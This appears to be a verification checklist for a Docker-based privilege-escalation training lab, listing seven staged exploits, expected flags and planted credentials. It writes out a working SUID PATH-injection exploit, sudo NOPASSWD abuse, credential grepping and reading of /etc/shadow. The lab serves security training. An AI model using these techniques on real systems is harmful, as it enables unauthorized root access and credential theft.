# ✅ Lab Verification & Testing Checklist

## Pre-Lab Verification

### System Requirements
- [ ] Docker installed (version 20.10+)
- [ ] Minimum 2GB RAM available
- [ ] 2GB free disk space
- [ ] SSH client installed
- [ ] Linux/Mac/Windows with WSL2

### Build Verification
- [ ] Dockerfile exists and is valid
- [ ] setup-lab.sh is executable
- [ ] All required files present
- [ ] Docker build completes without errors
- [ ] Image size is reasonable (~1.5-2GB)

### Container Startup
- [ ] Container starts without errors
- [ ] SSH daemon starts successfully
- [ ] Port 2222 is accessible
- [ ] Container health check passes

---

## Stage 1: Initial Access Verification

### Objective: Gain SSH access as player1
```bash
ssh -p 2222 player1@localhost
# Password: password123
```

**Verification Checklist:**
- [ ] SSH connection established
- [ ] Prompt shows: `player1@privesc-lab:~$`
- [ ] `whoami` returns `player1`
- [ ] `id` shows group `developers`
- [ ] `pwd` returns `/home/player1`

**Command Testing:**
```bash
✓ whoami                 # Output: player1
✓ id                     # Output: uid=1000(player1) gid=1000(player1) groups=...
✓ groups                 # Output: player1 developers
✓ cat /etc/hostname      # Output: privesc-lab
✓ uname -a               # Output: Linux privesc-lab 5.x.x...
```

**Expected Artifacts:**
- [ ] Successful SSH login
- [ ] User groups include `developers`
- [ ] Home directory `/home/player1` accessible
- [ ] System commands functional

---

## Stage 2: Credential Discovery Verification

### Objective: Find and read /home/shared/credentials.txt

**Verification Checklist:**
```bash
✓ cat /home/shared/credentials.txt
  Should contain:
  - Host: localhost
  - User: pwner
  - Password: password123
  - MySQL root password

✓ ls -la /home/shared/
  - credentials.txt with 644 permissions
  - World-readable file

✓ file /home/shared/credentials.txt
  Output: ASCII text

✓ grep -i "password" /home/shared/credentials.txt
  Multiple password entries found

✓ su - backup
  Should accept password: BackupPass@123
```

**Expected Credentials Found:**
- [ ] PostgreSQL: pwner / password123
- [ ] MySQL root: root / SuperSecret@2024
- [ ] Backup user: backup / BackupPass@123

**Database Detection:**
```bash
✓ ps aux | grep postgres    # PostgreSQL running
✓ ps aux | grep mysql       # MySQL/MariaDB check
✓ netstat -tlnp             # Ports 5432, 3306 visible
```

---

## Stage 3: SUID Exploitation Verification

### Objective: Exploit SUID binaries to escalate privileges

**Binary Verification:**
```bash
✓ ls -la /usr/local/bin/run-backup
  Output: -rwsr-xr-x (SUID bit set)

✓ ls -la /usr/local/bin/check-user
  Output: -rwsr-xr-x (SUID bit set)

✓ ls -la /usr/local/bin/log-system
  Output: -rwsr-xr-x (SUID bit set)

✓ file /usr/local/bin/run-backup
  Output: ELF 64-bit LSB shared object

✓ strings /usr/local/bin/run-backup | grep backup-runner
  Output: backup-runner (relative path found)
```

**Exploitation Verification:**
```bash
# Step 1: Create exploit directory
✓ mkdir -p /tmp/exploit_test
✓ ls -la /tmp/exploit_test  # Directory created

# Step 2: Create malicious binary
✓ cat > /tmp/exploit_test/backup-runner << 'EOF'
#!/bin/bash
/bin/bash -i
EOF
✓ chmod +x /tmp/exploit_test/backup-runner
✓ ls -la /tmp/exploit_test/backup-runner  # Executable

# Step 3: Modify PATH
✓ export PATH=/tmp/exploit_test:$PATH
✓ echo $PATH | grep exploit_test  # First in PATH

# Step 4: Execute SUID
✓ /usr/local/bin/run-backup
  Should drop to shell

# Step 5: Verify escalation
✓ id
  Output: uid=0(root) or elevated UID
✓ whoami
  Output: root or similar
```

**Expected Results:**
- [ ] SUID binary found with vulnerable code
- [ ] PATH injection successful
- [ ] Elevated shell obtained
- [ ] `id` shows elevated privileges

---

## Stage 4: Database Access Verification

### Objective: Connect to database and extract data

**Database Connection:**
```bash
✓ psql --version
  PostgreSQL client available

✓ psql -h localhost -U pwner -d postgres
  Password: password123
  Should connect successfully

✓ \l
  List of databases shown

✓ SELECT * FROM secret_flag;
  Output: FLAG{stage_4_db_access}
```

**Database Content Verification:**
```sql
✓ SELECT datname FROM pg_database;
  postgres, template0, template1 listed

✓ SELECT usename FROM pg_user;
  pwner, postgres, other users listed

✓ SELECT * FROM pg_tables WHERE schemaname='public';
  secret_flag table listed

✓ SELECT * FROM secret_flag;
  FLAG content retrieved
```

**Expected Credentials Working:**
- [ ] Host: localhost
- [ ] User: pwner
- [ ] Password: password123
- [ ] Database: postgres
- [ ] Port: 5432 (default)

---

## Stage 5: Environment Secrets Verification

### Objective: Extract secrets from environment files

**File Discovery:**
```bash
✓ ls -la /opt/vault/
  env.sh file present

✓ cat /opt/vault/env.sh
  Environment variables shown

✓ ls -la /opt/vault/env.sh
  Permissions: -rw-r--r-- (644 - readable)
```

**Secrets Extraction:**
```bash
✓ source /opt/vault/env.sh
  No errors

✓ echo $API_KEY
  Output: API_KEY_STAGE5_SECRET

✓ echo $DB_ADMIN_PASS
  Output: Admin@2024

✓ echo $MASTER_SECRET
  Output: FLAG{stage_5_env_variables}
```

**Additional Secrets:**
```bash
✓ cat /opt/services/backup.sh | grep -i pass
  DB_PASS="SuperSecret@2024" found

✓ grep -r "password\|secret" /opt --include="*.sh"
  Multiple credentials found
```

**Expected Environment Variables:**
- [ ] API_KEY=API_KEY_STAGE5_SECRET
- [ ] DB_ADMIN_PASS=Admin@2024
- [ ] MASTER_SECRET=FLAG{stage_5_env_variables}
- [ ] Additional service credentials

---

## Stage 6: Sudo Misconfiguration Verification

### Objective: Exploit sudo NOPASSWD rules

**Sudo Configuration:**
```bash
✓ sudo -l
  Matching Defaults entries shown
  
✓ sudo -l | grep NOPASSWD
  NOPASSWD entries visible

✓ cat /etc/sudoers.d/vulnerable
  Vulnerable rules displayed:
  - %developers ALL=(root) NOPASSWD: /usr/local/bin/run-backup
  - %webusers ALL=(root) NOPASSWD: /usr/bin/service
  - jenkins ALL=(devops) NOPASSWD: /usr/local/bin/check-user
```

**Group Membership:**
```bash
✓ groups player1
  Output: player1 developers
  
✓ groups | grep developers
  In developers group

✓ id -G
  Group IDs shown (including developers)
```

**Sudo Exploitation:**
```bash
✓ sudo /usr/local/bin/run-backup
  Executes without password

# Combine with SUID PATH injection
✓ export PATH=/tmp/exploit:$PATH
✓ sudo /usr/local/bin/run-backup
  Root shell obtained

# Verify
✓ id
  uid=0(root) gid=0(root)
```

**Expected Sudo Rules:**
- [ ] Developer group has NOPASSWD for run-backup
- [ ] Webusers group has NOPASSWD for service command
- [ ] Jenkins user can run commands as devops without password
- [ ] No password required for execution

---

## Stage 7: Root Access Verification

### Objective: Achieve root/highest privilege access

**Root Verification:**
```bash
✓ id
  uid=0(root) gid=0(root) groups=0(root)

✓ whoami
  root

✓ sudo -i
  root@privesc-lab:~#

✓ hostname
  privesc-lab
```

**Root Access Confirmation:**
```bash
✓ ls -la /root/
  .bashrc, .bash_history, etc. visible

✓ cat /root/.flag_final
  FLAG{stage_7_kernel_privesc_root}

✓ cat /etc/sudoers
  Full sudoers file readable

✓ cat /etc/shadow
  Shadow file readable
```

**System Compromise:**
```bash
✓ ps aux
  All processes visible

✓ netstat -tlnp
  All connections visible

✓ mount
  All filesystems visible

✓ df -h
  Full disk access
```

**Expected Root Proof:**
- [ ] `id` returns uid=0
- [ ] Final flag readable at /root/.flag_final
- [ ] All restricted files accessible
- [ ] Can modify system configuration

---

## Flag Collection Verification

### All 7 Flags Must Be Collected

```bash
✓ FLAG{stage_1_initial_access}
  Location: Implicit from SSH access
  Status: Obtained

✓ FLAG{stage_2_user_enumeration}
  Location: /home/shared/credentials.txt
  Status: [ ] Found

✓ FLAG{stage_3_suid_exploitation}
  Location: /tmp/.flag_s3 (after SUID exploit)
  Status: [ ] Found

✓ FLAG{stage_4_db_access}
  Location: PostgreSQL database table
  Command: SELECT * FROM secret_flag;
  Status: [ ] Found

✓ FLAG{stage_5_env_variables}
  Location: /opt/vault/env.sh (MASTER_SECRET variable)
  Status: [ ] Found

✓ FLAG{stage_6_sudo_misconfiguration}
  Location: /tmp/.flag_s6 (after sudo exploit)
  Status: [ ] Found

✓ FLAG{stage_7_kernel_privesc_root}
  Location: /root/.flag_final
  Status: [ ] Found
```

**Flag Collection Script:**
```bash
#!/bin/bash
echo "=== FLAG COLLECTION REPORT ==="
echo ""

echo "[1] Stage 1 - Initial Access"
echo "FLAG{stage_1_initial_access}"
echo ""

echo "[2] Stage 2 - User Enumeration"
grep "DATABASE\|MySQL" /home/shared/credentials.txt && echo "FLAG{stage_2_user_enumeration}"
echo ""

echo "[3] Stage 3 - SUID Exploitation"
if [ -f /tmp/.flag_s3 ]; then
    cat /tmp/.flag_s3
fi
echo ""

echo "[4] Stage 4 - Database Access"
psql -h localhost -U pwner -d postgres -c "SELECT * FROM secret_flag;" 2>/dev/null
echo ""

echo "[5] Stage 5 - Secrets Extraction"
source /opt/vault/env.sh 2>/dev/null
echo $MASTER_SECRET
echo ""

echo "[6] Stage 6 - Sudo Misconfiguration"
if [ -f /tmp/.flag_s6 ]; then
    cat /tmp/.flag_s6
fi
echo ""

echo "[7] Stage 7 - Root Access"
sudo cat /root/.flag_final 2>/dev/null || cat /root/.flag_final 2>/dev/null
echo ""

echo "=== END REPORT ==="
```

---

## Performance & Security Checks

### Container Performance
- [ ] Container starts in < 2 minutes
- [ ] SSH responds within 30 seconds
- [ ] Minimal CPU usage at idle
- [ ] Memory usage < 500MB

### Security Checks
- [ ] All SUID binaries documented
- [ ] SSH properly configured
- [ ] No unnecessary services running
- [ ] Proper file permissions set
- [ ] Credentials correctly exposed (intentionally)

### Network Tests
```bash
✓ ssh -p 2222 localhost "echo test"
  Works without interactive login

✓ ssh-keyscan -p 2222 localhost
  SSH key obtained

✓ timeout 5 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/2222'
  Port accessible
```

---

## Documentation Verification

- [ ] README.md complete and accurate
- [ ] SOLUTION.md provides correct solutions
- [ ] VULNERABILITIES.md lists all CVEs
- [ ] QUICKSTART.md clear and functional
- [ ] This checklist is comprehensive

---

## Testing Timeline

| Phase | Time | Tasks | Status |
|-------|------|-------|--------|
| Build | 2-5 min | Build image, start container | [ ] |
| Stage 1 | 2-5 min | SSH access | [ ] |
| Stage 2 | 5-10 min | Read credentials | [ ] |
| Stage 3 | 10-15 min | SUID exploit | [ ] |
| Stage 4 | 5 min | Database access | [ ] |
| Stage 5 | 5 min | Read secrets | [ ] |
| Stage 6 | 5-10 min | Sudo exploit | [ ] |
| Stage 7 | 5-10 min | Root access | [ ] |
| **Total** | **40-60 min** | **Complete exploitation** | [ ] |

---

## Troubleshooting Common Issues

### Issue: SSH Connection Refused
- [ ] Container running? `docker ps | grep privesc-lab`
- [ ] Port correct? Should be 2222
- [ ] Wait 60 seconds for SSH startup
- [ ] Check logs: `docker logs privesc-lab`

### Issue: Wrong Password
- [ ] User: `player1`
- [ ] Password: `password123`
- [ ] Check for typos
- [ ] Try SSH key method

### Issue: File Permissions Wrong
- [ ] Docker image rebuilt correctly?
- [ ] setup-lab.sh executed?
- [ ] File permissions set in setup script?

### Issue: Database Not Connecting
- [ ] PostgreSQL service running?
- [ ] Port 5432 accessible?
- [ ] Credentials correct?
- [ ] Try: `docker exec privesc-lab service postgresql status`

---

## Sign-Off

**Lab Successfully Verified:**
- [ ] All stages exploitable
- [ ] All flags collectable
- [ ] All vulnerabilities present
- [ ] Documentation complete
- [ ] Testing successful
- [ ] Ready for training

**Verified By:** ___________________  
**Verification Date:** ___________________  
**Lab Version:** 1.0

---

**Status:** ✅ Lab Ready for Deployment
